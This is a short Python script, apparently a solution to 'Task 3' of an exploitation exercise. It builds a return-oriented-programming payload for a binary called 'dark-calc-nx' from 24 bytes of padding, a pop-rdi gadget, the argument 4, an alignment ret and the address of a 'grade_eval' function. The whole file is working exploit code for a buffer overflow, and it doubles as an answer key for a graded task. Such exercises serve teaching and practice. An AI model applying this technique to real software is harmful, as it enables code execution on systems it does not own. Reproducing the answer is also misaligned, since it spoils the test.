#!/usr/bin/env python3
"""Task 3: ROP chain for dark-calc-nx -> grade_eval(4)."""
import sys
import struct

POP_RDI_RET = 0x401A33
RET_ALIGN   = 0x401A34
GRADE_EVAL  = 0x401978

payload  = b"A" * 24
payload += struct.pack("<Q", POP_RDI_RET)
payload += struct.pack("<Q", 4)
payload += struct.pack("<Q", RET_ALIGN)
payload += struct.pack("<Q", GRADE_EVAL)

sys.stdout.buffer.write(payload)
